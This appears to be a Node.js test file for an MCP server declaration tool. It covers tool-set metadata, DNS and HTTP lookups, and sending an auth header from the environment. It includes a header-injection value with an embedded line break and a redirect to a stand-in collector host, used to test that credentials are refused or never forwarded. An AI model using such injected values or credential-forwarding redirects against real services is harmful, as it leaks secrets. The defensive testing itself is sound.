  assert.match(HELP_PREPARE.replace(/\s+/g, ' '), /HISTOR, a third party watcher of MCP servers \(https:\/\/histor\.modelmarket\.dev\)/);
});

test('--histor-tool-sets in a dry run and an unsigned run: no pointer.json, and a note shows the member', async () => {
  for (const extra of [['--dry-run', '--key-env', 'MCP_PRIVATE_KEY'], []]) {
    const out = freshOut();
    await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--out', out, '--histor-tool-sets', '--json', ...extra], (r) => {
      assert.equal(r.code, 0, r.stdout + r.stderr);
      assert.equal(r.json.state, 'prepared_unsigned');
      assert.equal(r.json.historToolSets.check, null);
      assert.deepEqual(r.json.historToolSets.value, HISTOR_SET);
      assert.deepEqual(r.json.pointer.meta[PP][HM], HISTOR_SET, 'the predicted block holds it');
      assert.ok(r.json.notes.some((n) => n.startsWith(`--histor-tool-sets: pointer.json would also hold _meta["${PP}"]["${HM}"] = ${JSON.stringify(HISTOR_SET)}, the member HISTOR, a third party watcher (https://histor.modelmarket.dev), reads`)));
    }, { env: ENV });
    assert.deepEqual(filesUnder(out), ['declaration.unsigned.json']);
    // The unsigned declaration is the one a run without the option writes.
    const plain = freshOut();
    await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--out', plain, ...extra], (r) => assert.equal(r.code, 0), { env: ENV });
    assert.equal(readOut(out, 'declaration.unsigned.json'), readOut(plain, 'declaration.unsigned.json'));
  }
  // The text output shows the member in a note line.
  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--out', freshOut(), '--histor-tool-sets', '--dry-run'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.ok(r.stdout.includes('note: --histor-tool-sets: pointer.json would also hold'));
    assert.ok(r.stdout.includes(JSON.stringify(HISTOR_SET)));
  });
});

test('--histor-tool-sets: step 9 fails when the member digests differ from the declaration, and nothing is written', async () => {
  const builders = {
    'another digest': () => ({ value: { mtl: '1', sets: [{ digest: OTHER_DIGEST, count: 2 }] }, notes: [] }),
    'an extra set': () => ({ value: { mtl: '1', sets: [{ digest: tsd.contract.digest, count: 2 }, { digest: OTHER_DIGEST }] }, notes: [] }),
    'another count': () => ({ value: { mtl: '1', sets: [{ digest: tsd.contract.digest, count: 3 }] }, notes: [] }),
    'mtl as a number': () => ({ value: { mtl: 1, sets: [{ digest: tsd.contract.digest, count: 2 }] }, notes: [] }),
  };
  for (const [what, historToolSetsMember] of Object.entries(builders)) {
    const out = freshOut();
    const w = await world({ registry: baseRegistry(), site: baseSite(), extraDeps: { historToolSetsMember } });
    try {
      const r = await w.run([NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', out, '--histor-tool-sets', '--json'], { env: ENV });
      assert.equal(r.code, PREPARE_STATES.self_check_failed, `${what}: ${r.stdout}${r.stderr}`);
      assert.equal(r.json.state, 'self_check_failed');
      assert.equal(r.json.historToolSets.check, 'failed', what);
      assert.ok(r.json.reasons.length > 0 && r.json.reasons.every((x) => x.startsWith(`${HM}: `)), `${what}: ${r.json.reasons.join(' | ')}`);
      assert.match(r.json.steps.find((s) => s.step === 9).line, /the "dev\.modelmarket\.histor\/tool-sets" member does not match the signed declaration; nothing was written/);
    } finally {
      await w.close();
    }
    assert.deepEqual(filesUnder(out), [], what);
  }
});

test('histor-tool-sets.js: the member, its self check and the comparison follow the rules of HISTOR', async () => {
  const H = await import('../lib/histor-tool-sets.js');
  const digests = { spec: 'mcp-tool-set-digest/1', contract: tsd.contract.digest, extras: tsd.extras.digest };
  assert.deepEqual(H.historToolSetsMember(tsd.contract.digest, 2), { value: HISTOR_SET, notes: [] });
  assert.match(H.historToolSetsMember(tsd.contract.hex, 2).problem, /not in the form HISTOR reads/);
  const big = H.historToolSetsMember(tsd.contract.digest, 5001);
  assert.deepEqual(big.value, { mtl: '1', sets: [{ digest: tsd.contract.digest }] });
  assert.match(big.notes[0], /more than the 5000 HISTOR accepts as "count"/);
  assert.deepEqual(H.historMemberProblems(HISTOR_SET, digests, 2), []);
  assert.deepEqual(H.historMemberProblems({ mtl: '1', sets: [{ digest: tsd.contract.digest }] }, digests, 2), [], 'count is optional');
  assert.ok(H.historMemberProblems({ mtl: '1', sets: [] }, digests, 2).some((p) => /non-empty list/.test(p)));
  assert.ok(H.historMemberProblems({ mtl: '1', sets: Array.from({ length: 9 }, () => ({ digest: tsd.contract.digest })) }, digests, 2).some((p) => /more than the 8 HISTOR reads/.test(p)));
  assert.ok(H.historMemberProblems({ mtl: '1', sets: [{ digest: tsd.contract.hex }] }, digests, 2).some((p) => /not in the form HISTOR reads/.test(p)));
  assert.ok(H.historMemberProblems({ mtl: '1', sets: [{ digest: tsd.extras.digest }] }, digests, 2).some((p) => /the declaration signs the contract digest/.test(p)), 'the extras digest is not the one HISTOR compares');
  assert.equal(H.compareHistorDigests([tsd.contract.digest], digests), 'all');
  assert.equal(H.compareHistorDigests([tsd.contract.digest], { contract: tsd.contract.hex }), 'all', 'the hex form of a declaration compares by value');
  assert.equal(H.compareHistorDigests([tsd.contract.digest, OTHER_DIGEST], digests), 'some');
  assert.equal(H.compareHistorDigests([OTHER_DIGEST], digests), 'none');
  assert.equal(H.compareHistorDigests([], digests), null);
  assert.equal(H.compareHistorDigests([tsd.contract.digest], undefined), null, 'a 0.1 declaration has no contract digest');
  assert.equal(H.readHistorMember('x').readable, false);
  assert.equal(H.readHistorMember({ mtl: 1, sets: [{ digest: tsd.contract.digest }] }).readable, false);
  assert.deepEqual(H.readHistorMember({ mtl: '1', url: 'https://example.com/s.json' }, NAME), { readable: true, problem: null, mtl: '1', sets: 0, digests: [], url: 'https://example.com/s.json', urlRefused: null, skipped: [] });
});

// ---- field study (20 November 2026): first time publishers ----

const TOOLS_FILE = path.join(tmp, 'field-tools.json');
fs.writeFileSync(TOOLS_FILE, TOOLS_TEXT);
const latestPath = `${HOST}${folder}latest.json`;
const NO_DASH = /\s-\s|\s--\s|[‒-―−]/;

test('F1: with no pointer in the listing, latest.json that is definitely not a declaration gives a first declaration and a note', async () => {
  const bigHtml = '<!doctype html><html><body>' + 'x'.repeat(20000) + '</body></html>';
  const cases = [
    ['301 redirect', { status: 301, headers: { Location: 'https://www.example.com/' }, body: '' }, 'redirect', /HTTP 301, a permanent redirect to https:\/\/www\.example\.com\/, which check-listing does not follow/],
    ['308 redirect', { status: 308, headers: { Location: '/elsewhere' }, body: '' }, 'redirect', /HTTP 308, a permanent redirect/],
    ['200 over 16384 bytes', { status: 200, headers: { 'Content-Type': 'text/html' }, body: bigHtml }, 'too_large', /HTTP 200 with a body larger than 16384 bytes/],
    ['404 over 16384 bytes', { status: 404, headers: { 'Content-Type': 'text/html' }, body: bigHtml }, 'absent', /HTTP 404 with a body larger than 16384 bytes/],
  ];
  for (const [label, answer, result, seen] of cases) {
    const out = freshOut();
    await scenario({ registry: baseRegistry(), site: baseSite({ [latestPath]: answer }) }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', out, '--json'], (r) => {
      assert.equal(r.code, 0, `${label}: ${r.stdout}${r.stderr}`);
      assert.equal(r.json.state, 'prepared');
      assert.equal(r.json.previous.linked, false);
      assert.equal(r.json.previous.result, result, label);
      assert.match(r.json.previous.reason, seen, label);
      assert.equal(r.json.declaration.previous, null);
      const note = r.json.notes.find((n) => n.startsWith(`https://${HOST}${folder}latest.json answered`));
      assert.ok(note, `${label}: a note says what was seen at latest.json`);
      assert.match(note, /names no declaration and the registry lists 1 version of com\.example\/weather, and none names a declaration, so this run makes the first declaration for this server/);
      assert.ok(note.includes(`to be served in https://${HOST}${folder}, each with HTTP status 200 and no redirect`), note);
      assert.match(note, /If you served a declaration at that address before, do not use the files of this run/);
      assert.ok(!NO_DASH.test(note.replace(/--[a-z]/g, '')), 'no dash punctuation');
      assert.ok(!/\b(never|guaranteed|safe|secure|trusted)\b/i.test(note));
      assert.match(r.json.steps.find((s) => s.step === 5).line, /the listing names no declaration and the registry lists 1 version of com\.example\/weather, and none names a declaration, so there is no previous declaration/);
    }, { env: ENV });
    assert.ok(fs.existsSync(path.join(out, 'NEXT_STEPS.txt')), label);
  }
  // A small page that is not a declaration was already read as no previous declaration; it now gets the same note.
  await scenario({ registry: baseRegistry(), site: baseSite({ [latestPath]: { headers: { 'Content-Type': 'text/html' }, body: '<html>catch all</html>' } }) }, [NAME, '--for-version', '1.0.1', '--out', freshOut(), '--json'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.equal(r.json.previous.result, 'invalid');
    assert.ok(r.json.notes.some((n) => /latest\.json answered HTTP 200 with a file that is not linked as previous \(not a declaration: .*so this run makes the first declaration for this server\. The files this run writes for upload are to be served in/.test(n)), r.json.notes.join('\n'));
  });
});

test('F1: a host with no address in DNS, confirmed by the name servers, gives a first declaration; an unconfirmed ENOTFOUND does not', async () => {
  const enotfound = (u) => (u.hostname === HOST && u.pathname.endsWith('latest.json') ? async () => { throw Object.assign(new Error('getaddrinfo ENOTFOUND'), { code: 'ENOTFOUND' }); } : undefined);
  const asked = [];
  const resolvers = [];
  const noAddress = { dnsResolverFor: (server) => (resolvers.push(server), { tag: 'resolver' }), hostWithoutAddress: async (h, o) => (asked.push([h, o.resolver.tag]), { noAddress: true, detail: 'the name servers answered the A query with ENODATA and the AAAA query with ENODATA' }) };
  await scenario({ registry: baseRegistry(), site: baseSite(), lookupFor: enotfound, extraDeps: noAddress }, [NAME, '--for-version', '1.0.1', '--tools', TOOLS_FILE, '--key-env', 'MCP_PRIVATE_KEY', '--out', freshOut(), '--dns-server', '192.0.2.53', '--json'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.equal(r.json.previous.result, 'host_not_found');
    assert.match(r.json.previous.reason, /the host example\.com has no address in DNS \(the system lookup gave ENOTFOUND, and the name servers answered the A query with ENODATA/);
    assert.ok(r.json.notes.some((n) => /so example\.com needs an address in DNS first/.test(n)));
    assert.ok(r.json.fetched.some((f) => f.method === 'A/AAAA' && f.domain === HOST && f.answered === true));
  }, { env: ENV });
  assert.deepEqual(asked, [[HOST, 'resolver']]);
  assert.ok(resolvers.length > 0 && resolvers.every((s) => s === '192.0.2.53'), '--dns-server names the resolver asked');
  // The text output shows the DNS query as a request line.
  await scenario({ registry: baseRegistry(), site: baseSite(), lookupFor: enotfound, extraDeps: noAddress }, [NAME, '--for-version', '1.0.1', '--tools', TOOLS_FILE, '--out', freshOut()], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.match(r.stdout, /request: answered DNS A and AAAA queries for example\.com/);
  });
  // The name servers do not confirm it (a timeout): previous_unreadable, with the --no-previous way out.
  const unsure = { hostWithoutAddress: async () => ({ noAddress: false, detail: 'the name servers answered the A query with ETIMEOUT and the AAAA query with ETIMEOUT' }) };
  await scenario({ registry: baseRegistry(), site: baseSite(), lookupFor: enotfound, extraDeps: unsure }, [NAME, '--for-version', '1.0.1', '--tools', TOOLS_FILE, '--out', freshOut()], (r) => {
    assert.equal(r.code, 35, r.stdout + r.stderr);
    assert.match(r.stdout, /could not resolve host \(ENOTFOUND\); the name servers answered the A query with ETIMEOUT/);
    assert.match(r.stdout, /give --no-previous to make this the first one/);
  });
  // A lookup that throws is not taken as an answer either.
  await scenario({ registry: baseRegistry(), site: baseSite(), lookupFor: enotfound, extraDeps: { hostWithoutAddress: async () => { throw new Error('boom'); } } }, [NAME, '--for-version', '1.0.1', '--tools', TOOLS_FILE, '--out', freshOut()], (r) => {
    assert.equal(r.code, 35, r.stdout + r.stderr);
  });
  // EAI_AGAIN (the resolver could not answer) is a passing fault: the name servers are not even asked.
  let calls = 0;
  const again = (u) => (u.pathname.endsWith('latest.json') ? async () => { throw Object.assign(new Error('getaddrinfo EAI_AGAIN'), { code: 'EAI_AGAIN' }); } : undefined);
  await scenario({ registry: baseRegistry(), site: baseSite(), lookupFor: again, extraDeps: { hostWithoutAddress: async () => (calls++, { noAddress: true, detail: 'x' }) } }, [NAME, '--for-version', '1.0.1', '--tools', TOOLS_FILE, '--out', freshOut()], (r) => {
    assert.equal(r.code, 35, r.stdout + r.stderr);
    assert.match(r.stdout, /EAI_AGAIN/);
  });
  assert.equal(calls, 0);
});

test('F1: passing faults and temporary redirects at latest.json still stop the run, and a listing that names a pointer keeps its rules', async () => {
  const stops = [
    ['302', { status: 302, headers: { Location: '/' }, body: '' }, /answered HTTP 302/],
    ['307', { status: 307, headers: { Location: '/' }, body: '' }, /answered HTTP 307/],
    ['503', { status: 503, body: 'busy' }, /answered HTTP 503/],
    ['403', { status: 403, body: 'denied' }, /answered HTTP 403/],
    ['500 with a large body', { status: 500, body: 'y'.repeat(20000) }, /larger than 16384 bytes/],
    ['dropped connection', (req) => req.socket.destroy(), /could not be read/],
  ];
  for (const [label, answer, why] of stops) {
    await scenario({ registry: baseRegistry(), site: baseSite({ [latestPath]: answer }) }, [NAME, '--for-version', '1.0.1', '--tools', TOOLS_FILE, '--out', freshOut()], (r) => {
      assert.equal(r.code, 35, `${label}: ${r.stdout}${r.stderr}`);
      assert.match(r.stdout, why, label);
      assert.match(r.stdout, /names no declaration\. If you have not served a declaration at https:\/\/example\.com\/\.well-known\/addon-declaration\/com\.example\/weather\/latest\.json before, give --no-previous/, label);
    });
  }
  // With a pointer in the listing (even one that cannot be read), a redirect or a large body at latest.json stops as before, without that hint.
  const named = baseRegistry({ [regPath()]: { body: listingFor({ pointerTo: d2 }) } });
  const malformed = baseRegistry({ [regPath()]: { body: listingFor({ meta: { [PP]: { addonDeclaration: { url: 'not a url' } } } }) } });
  for (const [label, registry] of [['named pointer', named], ['malformed pointer', malformed]]) {
    for (const answer of [{ status: 301, headers: { Location: '/' }, body: '' }, { status: 200, body: 'z'.repeat(20000) }]) {
      await scenario({ registry, site: baseSite({ [latestPath]: answer, [`${HOST}${folder}by-hash/${hex(d2)}.json`]: { body: text(d2) } }) }, [NAME, '--for-version', '1.0.1', '--tools', TOOLS_FILE, '--out', freshOut()], (r) => {
        assert.equal(r.code, 35, `${label} ${answer.status}: ${r.stdout}${r.stderr}`);
        assert.ok(!/give --no-previous to make this the first one/.test(r.stdout), label);
      });
    }
  }
});

// An MCP server double that answers only with the right header value.
function guardedMcp(expect, { headerName = 'authorization', seen = [], echo = false } = {}) {
  return (req, res, body) => {
    seen.push(req.headers[headerName]);
    if (req.headers[headerName] !== expect) {
      if (echo) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ jsonrpc: '2.0', id: null, error: { code: -32000, message: `bad credential ${req.headers[headerName]}` } }));
      }
      res.writeHead(401, { 'WWW-Authenticate': 'Bearer resource_metadata="https://example.com/.well-known/oauth-protected-resource"' });
      return res.end();
    }
    return mcpServer()(req, res, body);
  };
}
const TOKEN = 'tok_9f8e7d6c5b4a39281706f5e4d3c2b1a0';
const BEARER = `Bearer ${TOKEN}`;

test('F2: --tools-header-env reads the publisher\'s own remote with a header from the environment; the value is not printed or written', async () => {
  const out = freshOut();
  const seenAuth = [];
  await scenario({ registry: baseRegistry(), site: baseSite({ [`POST ${HOST}/mcp`]: guardedMcp(BEARER, { seen: seenAuth }) }) }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--tools-header-env', 'Authorization=MCP_TOOLS_AUTH', '--out', out], (r, w) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.match(r.stdout, /step 4, tools: read 1 page of tools\/list from https:\/\/example\.com\/mcp/);
    assert.match(r.stdout, /note: --tools-header-env: Authorization \(the value from MCP_TOOLS_AUTH, not shown\) was sent with the requests to https:\/\/example\.com\/mcp only, over https/);
    assert.ok(!r.stdout.includes(TOKEN) && !r.stderr.includes(TOKEN), 'the value is not printed');
    // Only the remote got the header: no other request carried it.
    for (const s of w.seen) if (!(s.method === 'POST' && s.path === '/mcp')) assert.equal(s.headers.authorization, undefined, `${s.method} ${s.path}`);
  }, { env: { ...ENV, MCP_TOOLS_AUTH: `${BEARER}\r\n` } });
  assert.deepEqual(seenAuth, [BEARER], 'sent once, with the trailing line break dropped');
  for (const f of filesUnder(out)) assert.ok(!fs.readFileSync(path.join(out, f), 'utf8').includes(TOKEN), `${f} holds the value`);
  const next = fs.readFileSync(path.join(out, 'NEXT_STEPS.txt'), 'utf8');
  assert.match(next, /The tool list was read with --tools-header-env\. check-listing --fetch-tools sends no credentials, so for a remote that asks for authorization it reports the tool list as not checked/);
  assert.ok(!NO_DASH.test(next.replace(/--[a-z]/g, '')), 'no dash punctuation');
  // --json names the header, not the value.
  await scenario({ registry: baseRegistry(), site: baseSite({ [`POST ${HOST}/mcp`]: guardedMcp(TOKEN, { headerName: 'x-api-key' }) }) }, [NAME, '--for-version', '1.0.1', '--tools-header-env', 'X-API-KEY=MY_KEY', '--out', freshOut(), '--json'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.deepEqual(r.json.tools.headers, ['X-API-KEY']);
    assert.ok(!r.stdout.includes(TOKEN));
  }, { env: { MY_KEY: TOKEN } });
});

test('F2: a 401 or 403 says what to do next: --tools-header-env with the header the listing declares, or --tools with a saved list', async () => {
  await scenario({ registry: baseRegistry(), site: baseSite({ [`POST ${HOST}/mcp`]: mcpServer('auth') }) }, [NAME, '--for-version', '1.0.1', '--out', freshOut()], (r) => {
    assert.equal(r.code, 30, r.stdout + r.stderr);
    assert.match(r.stdout, /step 4, tools: https:\/\/example\.com\/mcp asked for authorization \(HTTP 401\)/);
    assert.match(r.stdout, /answered tools\/list with HTTP 401, so it asked for authorization/);
    assert.match(r.stdout, /--tools-header-env "Authorization=MCP_TOOLS_AUTH" with MCP_TOOLS_AUTH set to "Bearer <your token>"/);
    assert.match(r.stdout, /The value is sent only to https:\/\/example\.com\/mcp, over https, and is not printed or written/);
    assert.match(r.stdout, /or save the tools\/list result of this build as tools\.json \(the "result" object or the whole JSON-RPC response, as the server sent it, without "data:" framing; one file per page, in order\) and give --tools tools\.json/);
    const reasons = r.stdout.split('\n').filter((l) => l.startsWith('  reason: ')).join('\n');
    assert.ok(!NO_DASH.test(reasons.replace(/--[a-z]/g, '')), reasons);
  });
  // A listing that declares the header for the remote: that name is suggested.
  const withHeader = listingFor({ remotes: [{ type: 'streamable-http', url: REMOTE, headers: [{ name: 'X-API-KEY', isRequired: true, isSecret: true }] }] });
  await scenario({ registry: baseRegistry({ [regPath()]: { body: withHeader } }), site: baseSite({ [`POST ${HOST}/mcp`]: mcpServer('auth') }) }, [NAME, '--for-version', '1.0.1', '--out', freshOut()], (r) => {
    assert.equal(r.code, 30, r.stdout + r.stderr);
    assert.match(r.stdout, /--tools-header-env "X-API-KEY=MCP_TOOLS_HEADER" with MCP_TOOLS_HEADER set to the value of X-API-KEY \(the listing declares the header X-API-KEY for this remote\)/);
  });
  // A 403 with no Bearer challenge (the server then also refuses initialize): the same advice.
  const forbid = (req, res) => {
    res.writeHead(403, { 'Content-Type': 'text/plain' });
    res.end('forbidden');
  };
  await scenario({ registry: baseRegistry(), site: baseSite({ [`POST ${HOST}/mcp`]: forbid }) }, [NAME, '--for-version', '1.0.1', '--out', freshOut()], (r) => {
    assert.equal(r.code, 30, r.stdout + r.stderr);
    assert.match(r.stdout, /answered tools\/list with HTTP 403, so it asked for authorization/);
    assert.match(r.stdout, /--tools-header-env "Authorization=MCP_TOOLS_AUTH"/);
  });
  // The header given and still refused: check the variable; the value is not shown, also when the server repeats it.
  for (const echo of [false, true]) {
    await scenario({ registry: baseRegistry(), site: baseSite({ [`POST ${HOST}/mcp`]: guardedMcp('Bearer other', { echo }) }) }, [NAME, '--for-version', '1.0.1', '--tools-header-env', 'Authorization=MCP_TOOLS_AUTH', '--out', freshOut(), '--json'], (r) => {
      assert.equal(r.code, 30, r.stdout + r.stderr);
      assert.ok(!r.stdout.includes(TOKEN), `echo ${echo}: the value reached the output`);
      if (echo) assert.ok(r.stdout.includes('<header value hidden>'), 'the repeated value is hidden');
      else {
        assert.ok(r.json.reasons.some((x) => /also with the header Authorization sent from MCP_TOOLS_AUTH/.test(x)));
        assert.ok(r.json.reasons.some((x) => /check that MCP_TOOLS_AUTH holds the whole header value the server expects/.test(x)));
      }
    }, { env: { MCP_TOOLS_AUTH: BEARER } });
  }
});

test('F2: the header goes only to the listed remote over https, is not forwarded on a redirect, and bad input is refused before any request', async () => {
  // A redirect from the remote: not followed, so the other host gets nothing.
  const redirect = (req, res) => {
    res.writeHead(307, { Location: 'https://collector.example.net/mcp' });
    res.end();
  };
  await scenario({ registry: baseRegistry(), site: baseSite({ [`POST ${HOST}/mcp`]: redirect }) }, [NAME, '--for-version', '1.0.1', '--tools-header-env', 'Authorization=MCP_TOOLS_AUTH', '--out', freshOut()], (r, w) => {
    assert.equal(r.code, 30, r.stdout + r.stderr);
    assert.match(r.stdout, /redirect, which is not followed/);
    assert.ok(!w.seen.some((s) => s.host === 'collector.example.net'), 'the redirect target was not contacted');
    assert.equal(w.seen.filter((s) => s.headers.authorization !== undefined).length, 1, 'only the one request to the remote carried it');
  }, { env: { MCP_TOOLS_AUTH: BEARER } });
  // --server-json names a remote the listing does not: nothing is sent to it.
  const sj = path.join(tmp, 'server-other-remote.json');
  fs.writeFileSync(sj, JSON.stringify({ name: NAME, version: '1.0.1', remotes: [{ type: 'streamable-http', url: 'https://mcp.example.org/mcp' }] }));
  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--server-json', sj, '--tools-header-env', 'Authorization=MCP_TOOLS_AUTH', '--out', freshOut()], (r, w) => {
    assert.equal(r.code, 30, r.stdout + r.stderr);
    assert.match(r.stdout, /--tools-header-env sends its headers only to a streamable-http remote that the listing of 1\.0\.0 names, over https; the remote to read here, https:\/\/mcp\.example\.org\/mcp \(from server\.json\), is not one of them/);
    assert.ok(!w.seen.some((s) => s.method === 'POST'), 'no tools/list was sent');
  }, { env: { MCP_TOOLS_AUTH: BEARER } });
  // Usage errors: before any request, and nothing given is repeated.
  const bad = [
    [['--tools-header-env', `Authorization=${BEARER}`], {}, /after "=" comes the NAME of an environment variable/],
    [['--tools-header-env', `Authorization:${TOKEN}`], {}, /give --tools-header-env as HEADER=VARIABLE_NAME/],
    [['--tools-header-env', 'Authorization=MCP_TOOLS_AUTH'], {}, /the environment variable MCP_TOOLS_AUTH is not set/],
    [['--tools-header-env', 'Authorization=MCP_TOOLS_AUTH'], { MCP_TOOLS_AUTH: '  \n' }, /the environment variable MCP_TOOLS_AUTH is empty/],
    [['--tools-header-env', 'Authorization=MCP_TOOLS_AUTH'], { MCP_TOOLS_AUTH: `Bearer ${TOKEN}\nX-Injected: 1` }, /holds a line break, a control character/],
    [['--tools-header-env', 'Content-Type=MCP_TOOLS_AUTH'], { MCP_TOOLS_AUTH: BEARER }, /set by prepare itself/],
    [['--tools-header-env', 'Mcp-Session-Id=MCP_TOOLS_AUTH'], { MCP_TOOLS_AUTH: BEARER }, /set by prepare itself/],
    [['--tools-header-env', `${k.hex}=MCP_TOOLS_AUTH`], { MCP_TOOLS_AUTH: BEARER }, /looks like key material or a token/],
    [['--tools-header-env', 'Bad Name=MCP_TOOLS_AUTH'], { MCP_TOOLS_AUTH: BEARER }, /must be 1 to 64 letters/],
    [['--tools-header-env', 'Authorization=A', '--tools-header-env', 'authorization=B'], { A: 'x', B: 'y' }, /names the header authorization more than once/],
    [['--tools-header-env', 'Authorization=MCP_TOOLS_AUTH', '--tools', TOOLS_FILE], { MCP_TOOLS_AUTH: BEARER }, /give --tools-header-env or --tools, not both/],
    [['--dns-server', 'resolver.example'], {}, /--dns-server must be an IP address/],
  ];
  for (const [args, env, why] of bad) {
    await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.0.1', ...args, '--out', freshOut()], (r, w) => {
      assert.equal(r.code, 1, `${args.join(' ')}: ${r.stdout}${r.stderr}`);
      assert.match(r.stderr, why, args.join(' '));
      assert.ok(!r.stderr.includes(TOKEN) && !r.stdout.includes(TOKEN), 'the value is not repeated');
      assert.ok(!r.stderr.includes(k.hex), 'a key given as a name is not repeated');
      assert.equal(w.seen.length, 0, 'no request');
    }, { env });
  }
  // check-listing does not take the option (it sends no credentials, SPEC.md section 8a).
  const c = await cli(['check-listing', NAME, '--fetch-tools', '--tools-header-env', 'Authorization=X']);
  assert.equal(c.code, 1);
  assert.match(c.stderr, /--tools-header-env is not an option of check-listing/);
});

test('F2: fetchToolsList sends the extra headers on every request to the remote, and they cannot replace the protocol headers', async () => {
  const sent = [];
  let sessionEnded = false;
  const request = async (url, opts) => {
    sent.push({ url, method: opts.method, headers: { ...opts.headers } });
    const body = opts.body ? JSON.parse(opts.body) : null;
    if (opts.method === 'DELETE') {
      sessionEnded = true;
      return { status: 200, headers: {}, body: Buffer.alloc(0) };
    }
    if (body.params && body.params._meta) return { status: 400, headers: { 'content-type': 'text/plain' }, body: Buffer.from('old server') };
    if (body.method === 'initialize') return { status: 200, headers: { 'content-type': 'application/json', 'mcp-session-id': 'abc' }, body: Buffer.from(JSON.stringify({ jsonrpc: '2.0', id: body.id, result: { protocolVersion: '2025-11-25', capabilities: {}, serverInfo: { name: 's', version: '1' } } })) };
    if (body.method === 'notifications/initialized') return { status: 202, headers: {}, body: Buffer.alloc(0) };
    return { status: 200, headers: { 'content-type': 'application/json' }, body: Buffer.from(JSON.stringify({ jsonrpc: '2.0', id: body.id, result: TOOLS })) };
  };
  const got = await fetchToolsList(REMOTE, { request, headers: { Authorization: BEARER, Accept: 'text/html' } });
  assert.equal(got.era, 'legacy');
  assert.ok(sessionEnded);
  assert.equal(sent.length, 5);
  for (const s of sent) {
    assert.equal(s.url, REMOTE);
    assert.equal(s.headers.Authorization, BEARER, `${s.method} carries the header`);
    if (s.method === 'POST') assert.equal(s.headers.Accept, 'application/json, text/event-stream', 'the protocol header wins');
  }
});

test('F3: a dns lookup that timed out or got SERVFAIL is sent once more by prepare, and the message says a later run may help', async () => {
  // keysFromDns: retries only for ETIMEOUT and ESERVFAIL, and only when asked to.
  const flaky = (codes) => {
    const calls = [];
    return { calls, resolver: { resolveTxt: async (n) => { calls.push(n); const c = codes.shift(); if (c) throw Object.assign(new Error(c), { code: c }); return [[k.record]]; } } };
  };
  let f = flaky(['ETIMEOUT']);
  let r = await keysFromDns(HOST, { resolver: f.resolver, retries: 1 });
  assert.equal(r.error, undefined);
  assert.equal(r.keys.length, 1);
  assert.equal(f.calls.length, 2);
  assert.ok(r.notes.some((n) => /failed \(ETIMEOUT\) and was sent again/.test(n)));
  f = flaky(['ESERVFAIL', 'ESERVFAIL']);
  r = await keysFromDns(HOST, { resolver: f.resolver, retries: 1 });
  assert.match(r.error, /failed \(ESERVFAIL\), also when asked 2 times/);
  assert.equal(r.transient, true);
  assert.equal(f.calls.length, 2);
  f = flaky(['ETIMEOUT']);
  r = await keysFromDns(HOST, { resolver: f.resolver });
  assert.match(r.error, /ETIMEOUT/);
  assert.equal(f.calls.length, 1, 'verify and check-listing ask once (no retries by default)');
  f = flaky(['ECONNREFUSED']);
  r = await keysFromDns(HOST, { resolver: f.resolver, retries: 1 });
  assert.equal(f.calls.length, 1, 'other errors are not retried');
  assert.equal(r.transient, undefined);
  f = flaky(['ENOTFOUND']);
  r = await keysFromDns(HOST, { resolver: f.resolver, retries: 1 });
  assert.equal(r.error, undefined);
  assert.equal(f.calls.length, 1);

  // prepare asks keysFromDns with one retry, through the resolver --dns-server names.
  const opts = [];
  const dnsFail = { keysFromDns: async (domain, o) => (opts.push(o), { keys: [], notes: [], error: `DNS lookup for ${domain} failed (ETIMEOUT), also when asked 2 times`, transient: true }), dnsResolverFor: (server) => ({ server }) };
  await scenario({ registry: baseRegistry(), site: baseSite(), extraDeps: dnsFail }, [NAME, '--for-version', '1.0.1', '--method', 'dns', '--dns-server', '192.0.2.53', '--out', freshOut()], (r2) => {
    assert.equal(r2.code, 27, r2.stdout + r2.stderr);
    assert.match(r2.stdout, /timed out or got SERVFAIL from the resolver, also when it was sent a second time/);
    assert.match(r2.stdout, /a run a few minutes later may get an answer, so run prepare again/);
    assert.match(r2.stdout, /give --dns-server <IP address of a resolver you choose>/);
  });
  assert.ok(opts.length >= 1);
  assert.ok(opts.every((o) => o.retries === 1 && o.resolver.server === '192.0.2.53'));
  // Without --dns-server the system resolver is used (no address is added).
  opts.length = 0;
  await scenario({ registry: baseRegistry(), site: baseSite(), extraDeps: dnsFail }, [NAME, '--for-version', '1.0.1', '--method', 'dns', '--out', freshOut()], (r2) => {
    assert.equal(r2.code, 27, r2.stdout + r2.stderr);
  });
  assert.ok(opts.length >= 1 && opts.every((o) => o.resolver.server === undefined));
});

test('F4: an http lookup whose body is too large, followed by a dns key, does not read as a failure; a URL template remote says what can be done', async () => {
  const tooLarge = { keys: [], notes: [], error: 'could not fetch https://example.com/.well-known/mcp-registry-auth (body larger than 4096 bytes)' };
  await scenario({ registry: baseRegistry(), site: baseSite(), httpKeys: tooLarge, dnsKeys: { keys: published, notes: [] } }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', freshOut()], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.match(r.stdout, /step 2, key record: found by the dns method at the TXT records of example\.com: .*\(tried first: http at example\.com, no usable answer\)/);
    assert.ok(!/lookup failed|request: failed/.test(r.stdout), r.stdout);
    assert.match(r.stdout, /note: the http key lookup at example\.com gave no usable answer \(could not fetch .*body larger than 4096 bytes\)\); the key was then found by the dns method at the TXT records of example\.com, so this does not affect the declaration/);
    assert.match(r.stdout, /request: no usable answer, another key location answered \(could not fetch .*\) GET https:\/\/example\.com\/\.well-known\/mcp-registry-auth/);
